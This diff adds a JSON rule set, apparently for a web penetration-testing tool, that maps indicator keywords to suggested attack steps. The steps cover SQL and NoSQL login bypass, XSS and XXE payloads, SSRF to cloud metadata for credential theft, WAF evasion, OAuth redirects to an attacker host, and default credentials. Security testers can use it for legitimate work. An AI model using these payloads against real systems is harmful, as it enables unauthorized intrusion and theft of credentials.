@@ -1,0 +1,172 @@
+{
+  "fuzzing_required": {
+    "description": "API endpoints with rich input surface need aggressive parameter fuzzing for injection discovery",
+    "indicators": ["upload", "import", "submit", "api", "form", "search", "query"],
+    "suggested_actions": [
+      "Run ffuf -w params.txt:PARAM -w payloads.txt:VAL on all endpoints with -mc 200,201,302,500",
+      "Test ALL string params simultaneously with: ' \" <script>alert(1)</script> {{7*7}} ../../../etc/passwd",
+      "Fuzz HTTP methods: try PATCH/PUT/DELETE/CONNECT/TRACE on POST-only and GET-only endpoints"
+    ],
+    "severity": "HIGH"
+  },
+  "race_condition_likely": {
+    "description": "Financial/state-changing endpoints — race condition potential for double-spend or state corruption",
+    "indicators": ["payment", "checkout", "balance", "coupon", "transfer", "redeem", "withdraw"],
+    "suggested_actions": [
+      "Send 50 simultaneous requests with same idempotency key — check if action applied multiple times",
+      "Turbo Intruder gate: prepare all requests then release simultaneously with last-byte sync technique",
+      "Compare final state vs expected: 50 concurrent withdrawals of $1 should not exceed account balance"
+    ],
+    "severity": "HIGH"
+  },
+  "idor_hotspot": {
+    "description": "Object reference parameters (IDs) detected — IDOR highly likely across user/resource boundaries",
+    "indicators": ["user_id", "order_id", "file_id", "account_id", "doc_id", "ticket_id", "invoice_id", "record_id"],
+    "suggested_actions": [
+      "Replace your user_id with adjacent IDs (id-1, id+1, id+100) — check for other users data in response",
+      "Create two test accounts, capture account1 object IDs, access them from account2 authenticated session",
+      "Vertical escalation: use regular user session to access admin-owned object IDs (1, 2, 3, 999)"
+    ],
+    "severity": "CRITICAL"
+  },
+  "creative_bypass_needed": {
+    "description": "Security controls detected — WAF/filter bypass techniques required for exploit confirmation",
+    "indicators": ["waf", "cloudflare", "modsecurity", "akamai", "sucuri", "barracuda"],
+    "suggested_actions": [
+      "Encoding bypass: URL-encode, double-encode, Unicode normalize, hex-encode payloads to bypass WAF signatures",
+      "Case/whitespace: <ScRiPt>, null bytes %00, tab %09/newline %0a as whitespace alternatives in payloads",
+      "Split payload across multiple parameters or chunked Transfer-Encoding to evade single-field inspection"
+    ],
+    "severity": "MEDIUM"
+  },
+  "api_versioning_exposure": {
+    "description": "Multiple API versions active — older versions often lack security controls of current version",
+    "indicators": ["/v1/", "/v2/", "/v0/", "api/v", "version", "legacy", "deprecated"],
+    "suggested_actions": [
+      "If /api/v2/users has auth, test /api/v1/users and /api/v0/users — older versions often lack auth middleware",
+      "Probe /api/beta/, /api/internal/, /api/dev/, /api/test/ — dev/staging endpoints may bypass production auth",
+      "Compare response schemas between versions — v1 may return extra sensitive fields stripped in v2"
+    ],
+    "severity": "HIGH"
+  },
+  "authentication_bypass_surface": {
+    "description": "Login/auth endpoints — multiple bypass techniques applicable including SQLi, NoSQLi, and default creds",
+    "indicators": ["login", "signin", "authenticate", "sso", "saml", "password", "credential"],
+    "suggested_actions": [
+      "SQL injection: admin'-- in username field, ' OR '1'='1'-- in password — classic bypass",
+      "NoSQL injection: send JSON {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} as request body",
+      "Try default credentials: admin/admin, admin/password, root/root, admin/admin123, test/test — common defaults"
+    ],
+    "severity": "CRITICAL"
+  },
+  "session_security_testing": {
+    "description": "Session management — token predictability, fixation, and logout bypass testing",
+    "indicators": ["session", "remember", "persist", "keep-alive", "auto-login", "stay-logged"],
+    "suggested_actions": [
+      "Capture 10 sequential session tokens and analyze entropy/pattern — low entropy = predictable tokens",
+      "Session fixation: set session cookie before auth, verify it changes after successful login",
+      "Replay old cookie after logout against /api/user — check if server properly invalidates sessions"
+    ],
+    "severity": "HIGH"
+  },
+  "cors_misconfiguration_testing": {
+    "description": "CORS policy audit — reflective, null origin, subdomain wildcard with credentials",
+    "indicators": ["cors", "access-control", "cross-origin", "preflight", "credentials"],
+    "suggested_actions": [
+      "Send Origin: https://evil.com — check if reflected in Access-Control-Allow-Origin with Credentials: true",
+      "Send Origin: null — accessible from sandboxed iframes; some APIs explicitly allowlist null origin",
+      "Try Origin: https://evil.target.com — regex-based origin checks may allow any *.target.com subdomain"
+    ],
+    "severity": "HIGH"
+  },
+  "xxe_injection_surface": {
+    "description": "XML/SOAP/SVG processing endpoints — XXE injection potential for file read and blind SSRF",
+    "indicators": ["soap", "wsdl", "/xml", "svg", "docx", "xlsx", "saml", "rss", "atom"],
+    "suggested_actions": [
+      "Classic XXE: POST with <!DOCTYPE f [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><f>&e;</f>",
+      "OOB blind: <!ENTITY % p SYSTEM 'http://BURP-COLLABORATOR/'> — detect via DNS/HTTP callback",
+      "SVG upload XXE: <svg><image href='file:///etc/passwd'/></svg> — trigger via render/thumbnail endpoint"
+    ],
+    "severity": "CRITICAL"
+  },
+  "header_injection_testing": {
+    "description": "HTTP headers as SSRF/cache/redirect attack vectors — Host, X-Forwarded-For, Referer manipulation",
+    "indicators": ["proxy", "forward", "redirect", "host", "x-forwarded", "behind"],
+    "suggested_actions": [
+      "Host header injection: set Host: 169.254.169.254 — forces cloud metadata SSRF via proxy reflection",
+      "X-Forwarded-Host: attacker.com — check if reflected in redirect URL, email links, or password reset",
+      "Referer SSRF: Referer: http://169.254.169.254/latest/meta-data/ — apps that process Referer as URL"
+    ],
+    "severity": "HIGH"
+  },
+  "graphql_security_testing": {
+    "description": "GraphQL endpoint — introspection, batching abuse, depth attacks, IDOR via node enumeration",
+    "indicators": ["graphql", "/gql", "__schema", "apollo", "hasura", "mutation", "subscription"],
+    "suggested_actions": [
+      "Introspection: POST {\"query\":\"{__schema{types{name fields{name type{name}}}}}\"} — dump full schema",
+      "Rate limit bypass via batching: [{\"query\":\"mutation{login(u:'a',p:'x')}\"}] x1000 in one request",
+      "Field suggestion oracle: send invalid field name — use 'Did you mean X?' hints to discover hidden fields"
+    ],
+    "severity": "HIGH"
+  },
+  "error_disclosure_mining": {
+    "description": "Error messages and verbose responses leak DB structure, paths, and framework versions",
+    "indicators": ["debug", "exception", "stacktrace", "verbose", "trace", "error"],
+    "suggested_actions": [
+      "Trigger 500: send malformed JSON body, type mismatches, very long strings — capture full stack traces",
+      "SQLi error mining: inject ' in all string params — MySQL/MSSQL errors reveal table/column names",
+      "Type confusion: send array where scalar expected — some frameworks reveal internal type info in errors"
+    ],
+    "severity": "MEDIUM"
+  },
+  "cloud_metadata_testing": {
+    "description": "Cloud infrastructure detected — SSRF to metadata endpoint enables IAM credential theft",
+    "indicators": ["aws", "gcp", "azure", "cloud", "ec2", "lambda", "ecs", "s3", "blob"],
+    "suggested_actions": [
+      "AWS IMDS: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ via SSRF vector",
+      "GCP metadata: GET http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google header",
+      "Azure IMDS: GET http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata: true header"
+    ],
+    "severity": "CRITICAL"
+  },
+  "oauth_oidc_security_testing": {
+    "description": "OAuth2/OIDC implementation — state bypass, PKCE missing, redirect_uri manipulation",
+    "indicators": ["oauth", "openid", "oidc", "authorize", "callback", "pkce", "state", "code_challenge"],
+    "suggested_actions": [
+      "State bypass: remove state parameter from OAuth flow entirely — check if CSRF protection is enforced",
+      "Open redirect: try redirect_uri=https://attacker.com to steal auth code via referrer header",
+      "PKCE bypass: send code_challenge but omit code_verifier in token exchange — does server accept it?"
+    ],
+    "severity": "HIGH"
+  },
+  "api_key_leakage_hunting": {
+    "description": "API keys and secrets may leak in JS files, response headers, or exposed config endpoints",
+    "indicators": ["apikey", "api_key", "secret", "x-api-key", "private_key", "client_secret"],
+    "suggested_actions": [
+      "Search all JS files: grep -E '['\"]?(api[_-]?key|secret|token)['\"]?\\s*[:=]\\s*['\"][A-Za-z0-9]{20,}' *.js",
+      "Check response headers for leaked tokens: X-API-Key, X-Auth-Token, X-Secret",
+      "Probe: GET /.env, /config.json, /config.yaml, /secrets.json, /.git/config — common credential exposures"
+    ],
+    "severity": "CRITICAL"
+  },
+  "subdomain_takeover_testing": {
+    "description": "Subdomains with dangling CNAME to unclaimed services — takeover enables phishing and cookie theft",
+    "indicators": ["cname", "subdomain", "cdn", "s3", "github", "heroku", "netlify", "vercel", "azure"],
+    "suggested_actions": [
+      "For each subdomain with CNAME, resolve target and check if service is claimable (404/NoSuchBucket/unconfigured)",
+      "AWS S3: if CNAME points to BUCKETNAME.s3.amazonaws.com and bucket not found — create and claim it",
+      "Test if subdomain cookie scope affects main domain: set cookie on taken subdomain to steal parent session"
+    ],
+    "severity": "HIGH"
+  },
+  "default_credentials_testing": {
+    "description": "Admin panels and management interfaces may use default factory credentials",
+    "indicators": ["admin", "manager", "console", "dashboard", "panel", "management", "portal"],
+    "suggested_actions": [
+      "Try admin panels with: admin/admin, admin/password, admin/admin123, root/root, guest/guest",
+      "Service-specific: Jenkins=admin/admin, Grafana=admin/admin, Kibana=elastic/<blank>, Tomcat=tomcat/tomcat",
+      "Check /robots.txt, /sitemap.xml, /admin/, /.well-known/ for hidden admin paths then test default creds"
+    ],
+    "severity": "HIGH"
+  }
+}
